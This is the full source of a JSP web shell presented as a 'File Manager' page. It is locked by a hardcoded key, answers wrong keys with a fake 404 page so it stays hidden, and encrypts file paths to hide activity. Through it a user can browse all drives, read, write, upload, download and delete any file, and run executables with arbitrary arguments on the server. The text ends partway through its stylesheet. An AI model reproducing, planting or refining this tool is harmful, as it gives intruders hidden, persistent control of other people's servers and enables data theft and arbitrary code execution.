<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" %>
<%@ page import="java.io.*,java.nio.file.*,java.nio.charset.*,java.util.*,java.util.regex.*,java.security.*,javax.crypto.*,javax.crypto.spec.*" %>
<%!
// ============================================================
// CONFIGURATION
// ============================================================
static final String SERVER_KEY      = "MyS3cr3tServerK3y!"; // change this
static final int    EXEC_TIMEOUT_MS = 30000;
static final Set<String> EXE_EXTS;
static {
    EXE_EXTS = new HashSet<String>();
    for (String e : new String[]{".exe",".bat",".cmd",".com",".sh",".ps1",".py",".rb",".pl",""})
        EXE_EXTS.add(e);
}

// ============================================================
// BASE64 (Java 6/7 compatible — no java.util.Base64)
// ============================================================
static final String B64_CHARS =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static String b64Encode(byte[] data) {
    if (data == null || data.length == 0) return "";
    StringBuilder sb = new StringBuilder(((data.length + 2) / 3) * 4);
    int i = 0;
    while (i < data.length) {
        int b0 =                    data[i++] & 0xFF;
        int b1 = i < data.length ? data[i++] & 0xFF : 0;
        int b2 = i < data.length ? data[i++] & 0xFF : 0;
        sb.append(B64_CHARS.charAt( b0 >> 2));
        sb.append(B64_CHARS.charAt(((b0 & 0x03) << 4) | (b1 >> 4)));
        sb.append(B64_CHARS.charAt(((b1 & 0x0F) << 2) | (b2 >> 6)));
        sb.append(B64_CHARS.charAt(  b2 & 0x3F));
    }
    // Overwrite last 1 or 2 chars with '=' padding
    int pad = (3 - (data.length % 3)) % 3;
    for (int p = 0; p < pad; p++) sb.setCharAt(sb.length() - 1 - p, '=');
    return sb.toString();
}

static byte[] b64Decode(String s) {
    if (s == null || s.length() == 0) return new byte[0];
    // Strip anything that is not a valid base64 character
    s = s.replaceAll("[^A-Za-z0-9+/=]", "");
    // Pad to a multiple of 4 so charAt(i+1..3) never goes out of bounds
    while (s.length() % 4 != 0) s = s + "=";
    int len = s.length();
    int pad = 0;
    if (len > 0 && s.charAt(len - 1) == '=') pad++;
    if (len > 1 && s.charAt(len - 2) == '=') pad++;
    byte[] result = new byte[(len / 4) * 3 - pad];
    int idx = 0;
    for (int i = 0; i < len; i += 4) {
        int c0 = B64_CHARS.indexOf(s.charAt(i));
        int c1 = B64_CHARS.indexOf(s.charAt(i + 1));
        int c2 = s.charAt(i + 2) == '=' ? 0 : B64_CHARS.indexOf(s.charAt(i + 2));
        int c3 = s.charAt(i + 3) == '=' ? 0 : B64_CHARS.indexOf(s.charAt(i + 3));
        if (c0 < 0) c0 = 0;
        if (c1 < 0) c1 = 0;
        if (c2 < 0) c2 = 0;
        if (c3 < 0) c3 = 0;
        int v = (c0 << 18) | (c1 << 12) | (c2 << 6) | c3;
        if (idx < result.length) result[idx++] = (byte)(v >> 16);
        if (idx < result.length) result[idx++] = (byte)(v >>  8);
        if (idx < result.length) result[idx++] = (byte)(v      );
    }
    return result;
}

// ============================================================
// AES-256-CBC
// ============================================================
static byte[] deriveKey(String sessionKey) throws Exception {
    MessageDigest sha = MessageDigest.getInstance("SHA-256");
    return sha.digest(sessionKey.getBytes("UTF-8"));
}

static String aesEncrypt(String plain, String key) throws Exception {
    if (plain == null || plain.length() == 0) return "";
    byte[] keyBytes = deriveKey(key);
    SecretKeySpec sks = new SecretKeySpec(keyBytes, "AES");
    Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
    cipher.init(Cipher.ENCRYPT_MODE, sks);
    byte[] iv = cipher.getIV();
    byte[] ct = cipher.doFinal(plain.getBytes("UTF-8"));
    byte[] out = new byte[16 + ct.length];
    System.arraycopy(iv, 0, out, 0,  16);
    System.arraycopy(ct, 0, out, 16, ct.length);
    return b64Encode(out);
}

static String aesDecrypt(String cipherB64, String key) {
    if (cipherB64 == null || cipherB64.length() == 0) return "";
    try {
        byte[] data = b64Decode(cipherB64);
        byte[] iv   = new byte[16];
        byte[] body = new byte[data.length - 16];
        System.arraycopy(data, 0,  iv,   0, 16);
        System.arraycopy(data, 16, body, 0, body.length);
        byte[] keyBytes = deriveKey(key);
        SecretKeySpec sks = new SecretKeySpec(keyBytes, "AES");
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.DECRYPT_MODE, sks, new IvParameterSpec(iv));
        return new String(cipher.doFinal(body), "UTF-8");
    } catch (Exception e) { return ""; }
}

static String toSafe(String b64) {
    return b64.replace('+', '-').replace('/', '_').replace("=", "");
}
static String fromSafe(String safe) {
    String b64 = safe.replace('-', '+').replace('_', '/');
    int pad = b64.length() % 4;
    if (pad == 2) b64 += "==";
    else if (pad == 3) b64 += "=";
    return b64;
}

static String makeSessionKey(String userKey) throws Exception {
    MessageDigest sha = MessageDigest.getInstance("SHA-256");
    byte[] hash = sha.digest((userKey + SERVER_KEY).getBytes("UTF-8"));
    StringBuilder sb = new StringBuilder(64);
    for (byte b : hash) sb.append(String.format("%02x", b));
    return sb.toString();
}

static String fmtBytes(long b) {
    if (b < 1024)    return b + "B";
    if (b < 1048576) return String.format("%.1fKB", b / 1024.0);
    return String.format("%.1fMB", b / 1048576.0);
}

static String jsStr(String s) {
    if (s == null || s.length() == 0) return "";
    return s.replace("\\", "\\\\").replace("'", "\\'");
}

static String htmlEncode(String s) {
    if (s == null) return "";
    return s.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
             .replace("\"","&quot;").replace("'","&#39;");
}

static String resolvePath(String base, String path) {
    if (path == null || path.length() == 0) return "";
    File f = new File(path);
    if (!f.isAbsolute()) f = new File(base, path);
    try { return f.getCanonicalPath(); } catch (Exception e) { return f.getAbsolutePath(); }
}

// Read all bytes from an InputStream (Java 6 compatible, no readAllBytes())
static byte[] readAllBytes(InputStream is) throws IOException {
    ByteArrayOutputStream buf = new ByteArrayOutputStream();
    byte[] tmp = new byte[8192];
    int n;
    while ((n = is.read(tmp)) != -1) buf.write(tmp, 0, n);
    return buf.toByteArray();
}

// Read a file fully (Java 6 compatible)
static String readFile(File f) throws Exception {
    FileInputStream fis = new FileInputStream(f);
    try {
        byte[] data = readAllBytes(fis);
        return new String(data, "UTF-8");
    } finally { fis.close(); }
}

// Write bytes to a file
static void writeBytes(File f, byte[] data) throws Exception {
    FileOutputStream fos = new FileOutputStream(f);
    try { fos.write(data); } finally { fos.close(); }
}
%>
<%
// ============================================================
// HELPERS (per-request)
// ============================================================
boolean isAuth = "1".equals(session.getAttribute("auth"));
String  skey   = (String) session.getAttribute("skey");
if (skey == null) skey = "";

// ── Parse multipart body once upfront (no @MultipartConfig needed) ──
String _ct = request.getContentType();
boolean _isMP = _ct != null && _ct.toLowerCase().indexOf("multipart/") >= 0;

final Map _mpFields = new HashMap();   // String -> String  (text fields)
String  _uploadName  = null;
byte[]  _uploadBytes = null;

if (_isMP) {
    try {
        String _boundary = null;
        String[] _ctParts = _ct.split(";");
        for (int _i = 0; _i < _ctParts.length; _i++) {
            String _tok = _ctParts[_i].trim();
            if (_tok.startsWith("boundary=")) { _boundary = _tok.substring(9).trim(); break; }
        }
        if (_boundary != null) {
            byte[] _rawBody = readAllBytes(request.getInputStream());
            // Use ISO-8859-1 so binary bytes survive String round-trip
            String _bodyStr = new String(_rawBody, "ISO-8859-1");
            String _delim   = "--" + _boundary;
            String[] _segs  = _bodyStr.split(Pattern.quote(_delim));
            Pattern _pName  = Pattern.compile("name=\"([^\"]+)\"");
            Pattern _pFile  = Pattern.compile("filename=\"([^\"]+)\"");
            for (int _si = 0; _si < _segs.length; _si++) {
                String _seg = _segs[_si];
                if (_seg.indexOf("Content-Disposition") < 0) continue;
                int _hdrEnd = _seg.indexOf("\r\n\r\n");
                if (_hdrEnd < 0) continue;
                String _hdr = _seg.substring(0, _hdrEnd);
                Matcher _mn = _pName.matcher(_hdr);
                if (!_mn.find()) continue;
                String _fieldName = _mn.group(1);
                String _val = _seg.substring(_hdrEnd + 4);
                if (_val.endsWith("\r\n")) _val = _val.substring(0, _val.length() - 2);
                Matcher _mf = _pFile.matcher(_hdr);
                if (_mf.find()) {
                    // File part — keep raw ISO bytes
                    _uploadName  = new File(_mf.group(1)).getName();
                    _uploadBytes = _val.getBytes("ISO-8859-1");
                } else {
                    // Text field — convert to UTF-8
                    _mpFields.put(_fieldName, new String(_val.getBytes("ISO-8859-1"), "UTF-8").trim());
                }
            }
        }
    } catch (Exception _ex) { /* leave maps empty */ }
}

// Unified field reader — works for both urlencoded and multipart
final Map _mpFinal = _mpFields;
final boolean _isMPFinal = _isMP;
// (We use a helper method pattern since no lambdas in Java 6)
// getField(key) implemented inline as a macro-like call below:
// String val = _isMPFinal ? (String)_mpFinal.get(key) : request.getParameter(key); if (val==null) val="";

String _enc_skey = skey;  // for encrypt/decrypt closures (we call methods directly)

// CWD
String[] _cwd = { (String) session.getAttribute("cwd") };
if (_cwd[0] == null || _cwd[0].length() == 0 || !new File(_cwd[0]).isDirectory()) {
    _cwd[0] = request.getServletContext().getRealPath("/");
    session.setAttribute("cwd", _cwd[0]);
}
String cwd = _cwd[0];

String msgText = "";
String msgKind = "info";
boolean showMsg = false;

// ── getField helper (inline) ──────────────────────────────────
// Usage: String val = _gf("key");
// We define a local method substitute via a local block pattern.
// Since JSP scriptlet can't define methods, we inline it everywhere as:
//   String xxx = _isMPFinal ? ...(String)_mpFinal.get("key")... : request.getParameter("key");

// ============================================================
// AUTHENTICATION
// ============================================================
String _tmp; // reusable temp

// Read __ACTION
String action = _isMPFinal ? (String)_mpFinal.get("__ACTION") : request.getParameter("__ACTION");
if (action == null) action = "";

if ("login".equals(action)) {
    String key = _isMPFinal ? (String)_mpFinal.get("userKey") : request.getParameter("userKey");
    if (key == null) key = "";
    if (key.length() == 0) {
        msgText = "Enter a key."; msgKind = "err"; showMsg = true;
    } else if (!key.equals(SERVER_KEY)) {
        response.setStatus(404);
        response.setContentType("text/html");
        out.print("<html><body><h1>404 Not Found</h1></body></html>");
        return;
    } else {
        session.setAttribute("auth", "1");
        session.setAttribute("skey", makeSessionKey(key));
        isAuth = true;
        skey = (String) session.getAttribute("skey");
        _enc_skey = skey;
    }
} else if ("logout".equals(action) && isAuth) {
    session.invalidate();
    response.sendRedirect(request.getRequestURI());
    return;
}

isAuth = "1".equals(session.getAttribute("auth"));

// ============================================================
// DOWNLOAD
// ============================================================
_tmp = _isMPFinal ? (String)_mpFinal.get("hDownloadPath") : request.getParameter("hDownloadPath");
if (_tmp == null) _tmp = "";
if (isAuth && _tmp.length() > 0) {
    String fp = aesDecrypt(fromSafe(_tmp), skey);
    if (fp.length() > 0) {
        File dlf = new File(fp);
        if (dlf.isFile()) {
            response.reset();
            response.setContentType("application/octet-stream");
            response.setHeader("Content-Disposition", "attachment; filename=\"" + dlf.getName() + "\"");
            response.setHeader("Content-Length", String.valueOf(dlf.length()));
            byte[] _buf = new byte[8192];
            InputStream _dlis = new FileInputStream(dlf);
            OutputStream _dlos = response.getOutputStream();
            try { int _n; while ((_n = _dlis.read(_buf)) != -1) _dlos.write(_buf, 0, _n); }
            finally { _dlis.close(); }
            return;
        }
    }
}

// ============================================================
// AUTHENTICATED ACTIONS
// ============================================================
String openFile      = (String) session.getAttribute("openFile");      if (openFile      == null) openFile      = "";
String editorContent = (String) session.getAttribute("editorContent"); if (editorContent == null) editorContent = "";
String panelSess     = (String) session.getAttribute("panel");         if (panelSess     == null) panelSess     = "none";
String runExeSess    = (String) session.getAttribute("runExe");        if (runExeSess    == null) runExeSess    = "";
String newFileSess   = (String) session.getAttribute("newFile");       if (newFileSess   == null) newFileSess   = "";
String execOutput    = "";
boolean showExecResult = false;
String exeArgs = (String) session.getAttribute("exeArgs"); if (exeArgs == null) exeArgs = "";

// Macro to read a field
// String F(k) = _isMPFinal ? (String)_mpFinal.get(k) [null-safe] : request.getParameter(k) [null-safe]
// We define a helper inline block — used as: String _fv = _F("key");
// (actual substitution below)

if (isAuth) {

    // -- CD DIR --
    { String _fv = _isMPFinal ? (String)_mpFinal.get("__CDDIR") : request.getParameter("__CDDIR");
      if (_fv == null) _fv = "";
      if (_fv.length() > 0) {
          String dir = aesDecrypt(fromSafe(_fv), skey);
          if (new File(dir).isDirectory()) {
              _cwd[0] = dir; cwd = _cwd[0]; session.setAttribute("cwd", cwd);
              msgText = "Entered: " + dir; msgKind = "ok"; showMsg = true;
          }
      }
    }

    // -- READ FILE (click) --
    { String _fv = _isMPFinal ? (String)_mpFinal.get("__RDFILE") : request.getParameter("__RDFILE");
      if (_fv == null) _fv = "";
      if (_fv.length() > 0) {
          String fp = aesDecrypt(fromSafe(_fv), skey);
          File rff = new File(fp);
          if (rff.isFile()) {
              try {
                  String content = readFile(rff);
                  session.setAttribute("editorContent", content);
                  session.setAttribute("openFile", fp);
                  session.setAttribute("panel", "editor");
                  openFile = fp; editorContent = content; panelSess = "editor";
                  msgText = "Read: " + fp; msgKind = "ok"; showMsg = true;
              } catch(Exception ex) { msgText = "Read error: " + ex.getMessage(); msgKind = "err"; showMsg = true; }
          }
      }
    }

    // -- RUN EXE (set panel) --
    { String _fv = _isMPFinal ? (String)_mpFinal.get("__RUNEXE") : request.getParameter("__RUNEXE");
      if (_fv == null) _fv = "";
      if (_fv.length() > 0) {
          String rp = aesDecrypt(fromSafe(_fv), skey);
          if (rp.length() > 0) {
              session.setAttribute("runExe", rp); session.setAttribute("panel", "exec");
              runExeSess = rp; panelSess = "exec";
              msgText = "Ready to run: " + new File(rp).getName(); msgKind = "info"; showMsg = true;
          }
      }
    }

    // -- DELETE FILE --
    { String _fv = _isMPFinal ? (String)_mpFinal.get("__DELFILE") : request.getParameter("__DELFILE");
      if (_fv == null) _fv = "";
      if (_fv.length() > 0) {
          String fp = aesDecrypt(fromSafe(_fv), skey);
          if (fp.length() > 0) {
              File df = new File(fp);
              if (df.isFile()) {
                  try {
                      df.delete();
                      if (fp.equals(openFile)) {
                          session.removeAttribute("openFile"); session.removeAttribute("editorContent");
                          session.removeAttribute("panel");    session.removeAttribute("newFile");
                          openFile = ""; editorContent = ""; panelSess = "none"; newFileSess = "";
                      }
                      msgText = "Deleted: " + fp; msgKind = "ok"; showMsg = true;
                  } catch(Exception ex) { msgText = "Delete error: " + ex.getMessage(); msgKind = "err"; showMsg = true; }
              } else { msgText = "File not found."; msgKind = "err"; showMsg = true; }
          }
      }
    }

    // -- GO TO PATH --
    if ("go".equals(action)) {
        String _fv = _isMPFinal ? (String)_mpFinal.get("hPath") : request.getParameter("hPath");
        if (_fv == null) _fv = "";
        String dir = resolvePath(cwd, aesDecrypt(fromSafe(_fv), skey));
        if (dir.length() == 0) { msgText = "Enter a path."; msgKind = "err"; showMsg = true; }
        else if (!new File(dir).isDirectory()) { msgText = "Not found: " + dir; msgKind = "err"; showMsg = true; }
        else { _cwd[0] = dir; cwd = _cwd[0]; session.setAttribute("cwd", cwd); msgText = "Directory: " + dir; msgKind = "ok"; showMsg = true; }
    }

    // -- READ (manual) --
    if ("read".equals(action)) {
        String _fv = _isMPFinal ? (String)_mpFinal.get("hFilename") : request.getParameter("hFilename");
        if (_fv == null) _fv = "";
        String fp = resolvePath(cwd, aesDecrypt(fromSafe(_fv), skey));
        File ff = new File(fp);
        if (!ff.isFile()) { msgText = "File not found: " + fp; msgKind = "err"; showMsg = true; }
        else {
            try {
                String content = readFile(ff);
                session.setAttribute("editorContent", content); session.setAttribute("openFile", fp); session.setAttribute("panel", "editor");
                openFile = fp; editorContent = content; panelSess = "editor";
                msgText = "Read: " + fp; msgKind = "ok"; showMsg = true;
            } catch(Exception ex) { msgText = "Read error: " + ex.getMessage(); msgKind = "err"; showMsg = true; }
        }
    }

    // -- WRITE / SAVE --
    if ("write".equals(action)) {
        String _fnFv = _isMPFinal ? (String)_mpFinal.get("hFilenamePlain") : request.getParameter("hFilenamePlain");
        if (_fnFv == null) _fnFv = "";
        String fname = _fnFv.length() > 0 ? _fnFv : openFile;
        if (fname.length() == 0) { msgText = "Enter a filename."; msgKind = "err"; showMsg = true; }
        else {
            String full = resolvePath(cwd, fname);
            String _b64Fv = _isMPFinal ? (String)_mpFinal.get("hContentPlain") : request.getParameter("hContentPlain");
            if (_b64Fv == null) _b64Fv = "";
            String body = "";
            if (_b64Fv.length() > 0) {
                try { body = new String(b64Decode(_b64Fv), "UTF-8"); } catch (Exception _e2) { body = _b64Fv; }
            }
            try {
                writeBytes(new File(full), body.getBytes("UTF-8"));
                session.setAttribute("openFile", full); session.removeAttribute("newFile");
                openFile = full; newFileSess = "";
                msgText = "Saved: " + full; msgKind = "ok"; showMsg = true;
            } catch(Exception ex) { msgText = "Write error: " + ex.getMessage(); msgKind = "err"; showMsg = true; }
        }
    }

    // -- NEW FILE --
    if ("new".equals(action)) {
        session.removeAttribute("openFile"); session.removeAttribute("editorContent");
        session.setAttribute("panel", "editor"); session.setAttribute("newFile", "1");
        openFile = ""; editorContent = ""; panelSess = "editor"; newFileSess = "1";
        msgText = "New file – enter a name and content, then Save."; msgKind = "info"; showMsg = true;
    }

    // -- CANCEL EDIT --
    if ("cancelEdit".equals(action)) {
        session.removeAttribute("openFile"); session.removeAttribute("panel");
        session.removeAttribute("newFile");  session.removeAttribute("editorContent");
        openFile = ""; panelSess = "none"; newFileSess = ""; editorContent = "";
    }

    // -- UP --
    if ("up".equals(action)) {
        File parent = new File(cwd).getParentFile();
        if (parent != null) {
            _cwd[0] = parent.getAbsolutePath(); cwd = _cwd[0]; session.setAttribute("cwd", cwd);
            msgText = "Up to: " + cwd; msgKind = "ok"; showMsg = true;
        } else { msgText = "Already at root."; msgKind = "info"; showMsg = true; }
    }

    // -- UPLOAD --
    if ("upload".equals(action)) {
        if (_uploadName == null || _uploadName.length() == 0 || _uploadBytes == null) {
            msgText = "No file received."; msgKind = "err"; showMsg = true;
        } else {
            try {
                writeBytes(new File(cwd, _uploadName), _uploadBytes);
                msgText = "Uploaded: " + _uploadName + " (" + fmtBytes(_uploadBytes.length) + ")";
                msgKind = "ok"; showMsg = true;
            } catch(Exception ex) { msgText = "Upload error: " + ex.getMessage(); msgKind = "err"; showMsg = true; }
        }
    }

    // -- EXECUTE --
    if ("exec".equals(action)) {
        String _hepFv   = _isMPFinal ? (String)_mpFinal.get("hExePath")      : request.getParameter("hExePath");      if (_hepFv   == null) _hepFv   = "";
        String _hepPlFv = _isMPFinal ? (String)_mpFinal.get("hExePathPlain") : request.getParameter("hExePathPlain"); if (_hepPlFv == null) _hepPlFv = "";
        String _argsFv  = _isMPFinal ? (String)_mpFinal.get("exeArgs")       : request.getParameter("exeArgs");       if (_argsFv  == null) _argsFv  = "";
        String fp = runExeSess.length() > 0 ? runExeSess : (_hepPlFv.length() > 0 ? _hepPlFv : aesDecrypt(fromSafe(_hepFv), skey));
        session.setAttribute("exeArgs", _argsFv); exeArgs = _argsFv;
        File ef = new File(fp);
        if (fp.length() == 0 || !ef.isFile()) {
            msgText = "Executable not found: " + fp; msgKind = "err"; showMsg = true;
        } else {
            try {
                List cmd = new ArrayList();
                cmd.add(fp);
                if (_argsFv.length() > 0) {
                    String[] _argArr = _argsFv.split("\\s+");
                    for (int _ai = 0; _ai < _argArr.length; _ai++) if (_argArr[_ai].length() > 0) cmd.add(_argArr[_ai]);
                }
                ProcessBuilder pb = new ProcessBuilder(cmd);
                pb.directory(ef.getParentFile());
                pb.redirectErrorStream(false);
                final Process proc = pb.start();
                final StringBuilder _stdout = new StringBuilder();
                final StringBuilder _stderr = new StringBuilder();

                Thread t1 = new Thread(new Runnable() { public void run() {
                    try { BufferedReader r = new BufferedReader(new InputStreamReader(proc.getInputStream(), "UTF-8"));
                          String line; while ((line = r.readLine()) != null) _stdout.append(line).append("\n");
                          r.close();
                    } catch (IOException ignored) {}
                }});
                Thread t2 = new Thread(new Runnable() { public void run() {
                    try { BufferedReader r = new BufferedReader(new InputStreamReader(proc.getErrorStream(), "UTF-8"));
                          String line; while ((line = r.readLine()) != null) _stderr.append(line).append("\n");
                          r.close();
                    } catch (IOException ignored) {}
                }});
                t1.start(); t2.start();

                // Timeout loop (no waitFor(timeout) in Java 6)
                long _deadline = System.currentTimeMillis() + EXEC_TIMEOUT_MS;
                boolean _done = false;
                while (System.currentTimeMillis() < _deadline) {
                    try { proc.exitValue(); _done = true; break; } catch (IllegalThreadStateException _itse) {}
                    try { Thread.sleep(100); } catch (InterruptedException _ie) { break; }
                }
                if (!_done) proc.destroy();
                t1.join(1000); t2.join(1000);

                StringBuilder sb = new StringBuilder();
                sb.append("=== ").append(fp).append(" ").append(_argsFv).append("\n");
                sb.append("=== Exit: ").append(_done ? String.valueOf(proc.exitValue()) : "killed (timeout)").append(" ===\n");
                if (_stdout.length() > 0) sb.append(_stdout);
                if (_stderr.length() > 0) sb.append("--- STDERR ---\n").append(_stderr);
                if (!_done) sb.append("(Process exceeded timeout and was killed.)\n");
                execOutput = sb.toString(); showExecResult = true;
                session.setAttribute("panel", "exec"); panelSess = "exec";
                String exitInfo = _done ? " (exit " + proc.exitValue() + ")" : " (timeout)";
                msgText = "Executed: " + ef.getName() + exitInfo;
                msgKind = (_done && proc.exitValue() == 0) ? "ok" : "err"; showMsg = true;
            } catch(Exception ex) {
                execOutput = "ERROR: " + ex.getMessage(); showExecResult = true;
                session.setAttribute("panel", "exec"); panelSess = "exec";
                msgText = "Exec failed: " + ex.getMessage(); msgKind = "err"; showMsg = true;
            }
        }
    }

    // -- CANCEL EXEC --
    if ("cancelExec".equals(action)) {
        session.removeAttribute("runExe"); session.removeAttribute("panel");
        runExeSess = ""; panelSess = "none"; exeArgs = "";
    }
}

// ============================================================
// BUILD FILE LISTING
// ============================================================
StringBuilder listing = new StringBuilder();
if (isAuth) {
    // Drives
    File[] roots = File.listRoots();
    for (int _ri = 0; _ri < roots.length; _ri++) {
        File root = roots[_ri];
        String enc  = toSafe(aesEncrypt(root.getAbsolutePath(), skey));
        String safe = htmlEncode(root.getAbsolutePath());
        listing.append("<div class='entry entry-drive' onclick='cdDir(\"").append(enc).append("\")'>");
        listing.append("<span class='entry-icon'>&#128190;</span>");
        listing.append("<span class='entry-name' title='").append(safe).append("'>").append(safe).append("</span>");
        listing.append("<span class='entry-meta'></span></div>");
    }
    // Directories
    try {
        File[] dirs = new File(cwd).listFiles(new FileFilter() { public boolean accept(File f) { return f.isDirectory(); } });
        if (dirs != null) {
            Arrays.sort(dirs, new Comparator() { public int compare(Object a, Object b) { return ((File)a).getName().compareToIgnoreCase(((File)b).getName()); } });
            for (int _di = 0; _di < dirs.length; _di++) {
                File d = dirs[_di];
                String enc  = toSafe(aesEncrypt(d.getAbsolutePath(), skey));
                String safe = htmlEncode(d.getName());
                listing.append("<div class='entry entry-dir' onclick='cdDir(\"").append(enc).append("\")'>");
                listing.append("<span class='entry-icon'>&#128193;</span>");
                listing.append("<span class='entry-name' title='").append(safe).append("'>").append(safe).append("</span>");
                listing.append("<span class='entry-meta'></span></div>");
            }
        }
    } catch(Exception _e) { listing.append("<div class='entry-err'>Cannot list directories.</div>"); }
    // Files
    try {
        File[] files = new File(cwd).listFiles(new FileFilter() { public boolean accept(File f) { return f.isFile(); } });
        if (files != null) {
            Arrays.sort(files, new Comparator() { public int compare(Object a, Object b) { return ((File)a).getName().compareToIgnoreCase(((File)b).getName()); } });
            for (int _fi = 0; _fi < files.length; _fi++) {
                File f = files[_fi];
                String nm   = f.getName();
                String ext  = nm.contains(".") ? nm.substring(nm.lastIndexOf('.')).toLowerCase() : "";
                boolean isEx = EXE_EXTS.contains(ext);
                String enc  = toSafe(aesEncrypt(f.getAbsolutePath(), skey));
                String safe = htmlEncode(nm);
                String cls  = isEx ? "entry-exe" : "entry-file";
                String icon = isEx ? "&#9881;" : "&#128196;";
                String meta = fmtBytes(f.length());
                listing.append("<div class='entry ").append(cls).append("' onclick='readFile(\"").append(enc).append("\")'>");
                listing.append("<span class='entry-icon'>").append(icon).append("</span>");
                listing.append("<span class='entry-name' title='").append(safe).append("'>").append(safe).append("</span>");
                listing.append("<span class='entry-meta'>").append(meta).append("</span>");
                listing.append("<span class='entry-actions'>");
                listing.append("<button class='act-btn' title='Read' onclick='event.stopPropagation();readFile(\"").append(enc).append("\")'>&#128065;</button>");
                listing.append("<button class='act-btn act-dl' title='Download' onclick='event.stopPropagation();downloadFile(\"").append(enc).append("\")'>&#8659;</button>");
                if (isEx)
                    listing.append("<button class='act-btn act-run' title='Run' onclick='event.stopPropagation();runExe(\"").append(enc).append("\")'>&#9654;</button>");
                listing.append("<button class='act-btn act-del' title='Delete' onclick='event.stopPropagation();deleteFile(\"").append(enc).append("\",\"").append(safe).append("\")'>&#128465;</button>");
                listing.append("</span></div>");
            }
        }
    } catch(Exception _e) { listing.append("<div class='entry-err'>Cannot list files.</div>"); }
}

String finalCwd          = cwd;
String finalOpenFile     = openFile;
String finalEditorContent = editorContent;
String finalRunExe       = runExeSess;
String finalPanel        = panelSess;
String finalNewFile      = newFileSess;
String finalExeArgs      = exeArgs;
String finalExecOutput   = execOutput;
boolean finalShowExec    = showExecResult;
String authSKey          = isAuth ? skey : "";
%>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>File Manager</title>
<style>
:root {
  --bg:#0d0f14;--surface:#13161e;--surface2:#1a1e2a;
  --border:#252a38;--border2:#2e3448;
  --accent:#4f9eff;--accent2:#7b61ff;
  --ok:#22d392;--err:#ff5f5f;--info:#f0c040;--run:#ff9f40;
  --text:#d4daf0;--muted:#606880;--dim:#3a3f55;
  --mono:'Courier New',monospace;--sans:'Segoe UI',system-ui,sans-serif;
  --sidebar:260px;--hdr:48px;
}
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%;overflow:hidden}
body{background:var(--bg);color:var(--text);font-family:var(--sans);font-size:13px;display:flex;flex-direction:column}
input[type=hidden]{display:none!important}
.login-wrap{min-height:100vh;display:flex;align-items:center;justify-content:center}
.login-box{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:36px 40px;width:360px;display:flex;flex-direction:column;gap:18px}
.login-title{font-size:1.2rem;font-weight:700;text-align:center;background:linear-gradient(90deg,var(--accent),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.login-sub{font-size:12px;color:var(--muted);text-align:center;margin-top:-10px}
.login-field{display:flex;flex-direction:column;gap:6px}
.login-field label{font-size:12px;color:var(--muted)}
.login-field input{background:var(--surface2);border:1px solid var(--border);color:var(--text);border-radius:7px;padding:9px 12px;font-size:14px;font-family:var(--mono);outline:none;width:100%;letter-spacing:.1em;transition:border-color .15s}
.login-field input:focus{border-color:var(--accent)}
.login-err{color:var(--err);font-size:12px;text-align:center}
.btn-login{background:linear-gradient(90deg,var(--accent),var(--accent2));color:#fff;border:none;border-radius:7px;padding:10px;font-size:14px;font-weight:700;cursor:pointer;width:100%;transition:opacity .15s}
.btn-login:hover{opacity:.88}
.topbar{height:var(--hdr);background:var(--surface);border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;padding:0 14px;flex-shrink:0;z-index:10}
.topbar-logo{font-weight:700;font-size:14px;letter-spacing:.04em;white-space:nowrap;background:linear-gradient(90deg,var(--accent),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.topbar-path{font-family:var(--mono);font-size:11px;color:var(--muted);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;background:var(--surface2);border:1px solid var(--border);border-radius:5px;padding:3px 8px}
.topbar-msg{font-size:11px;padding:3px 10px;border-radius:5px;white-space:nowrap;max-width:400px;overflow:hidden;text-overflow:ellipsis}
.msg-ok{background:#0a2a1e;border:1px solid #1e5040;color:var(--ok)}
.msg-err{background:#2a0e0e;border:1px solid #5a2020;color:var(--err)}
.msg-info{background:#2a2208;border:1px solid #5a4a10;color:var(--info)}
.btn-logout{background:none;border:1px solid var(--border);color:var(--muted);border-radius:5px;padding:3px 10px;font-size:11px;cursor:pointer;white-space:nowrap}
.btn-logout:hover{color:var(--err);border-color:var(--err)}
.layout{display:flex;flex:1;overflow:hidden;height:calc(100vh - var(--hdr));min-height:0}
.sidebar{width:var(--sidebar);min-width:var(--sidebar);max-width:var(--sidebar);background:var(--surface);border-right:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden;height:100%}
.sidebar-nav{display:flex;gap:4px;padding:8px;border-bottom:1px solid var(--border);flex-shrink:0}
.sidebar-search{padding:6px 8px;border-bottom:1px solid var(--border);flex-shrink:0}
.sidebar-search input{width:100%;background:var(--surface2);border:1px solid var(--border);color:var(--text);border-radius:5px;padding:4px 8px;font-size:12px;font-family:var(--mono);outline:none}
.sidebar-search input:focus{border-color:var(--accent)}
.sidebar-upload{display:flex;gap:4px;padding:6px 8px;border-bottom:1px solid var(--border);flex-shrink:0;align-items:center}
.sidebar-list{flex:1;overflow-y:scroll;overflow-x:hidden;padding:4px 0;min-height:0}
.cd-row{display:flex;gap:4px;padding:6px 8px;flex-shrink:0;border-top:1px solid var(--border)}
.cd-row input{flex:1;background:var(--surface2);border:1px solid var(--border);color:var(--text);border-radius:5px;padding:4px 8px;font-family:var(--mono);font-size:11px;outline:none}
.cd-row input:focus{border-color:var(--accent)}
.upload-input{flex:1;min-width:0;font-size:11px;color:var(--muted);background:var(--surface2);border:1px solid var(--border);border-radius:5px;padding:3px 6px;cursor:pointer;overflow:hidden}
.upload-input::-webkit-file-upload-button{background:var(--surface);border:1px solid var(--border);color:var(--muted);border-radius:4px;padding:2px 6px;font-size:10px;cursor:pointer}
.entry{display:flex;align-items:center;gap:6px;padding:4px 8px;cursor:pointer;border-radius:4px;margin:0 4px;transition:background .1s;user-select:none;min-height:28px}
.entry:hover{background:var(--surface2)}
.entry-icon{font-size:13px;flex-shrink:0;width:16px;text-align:center}
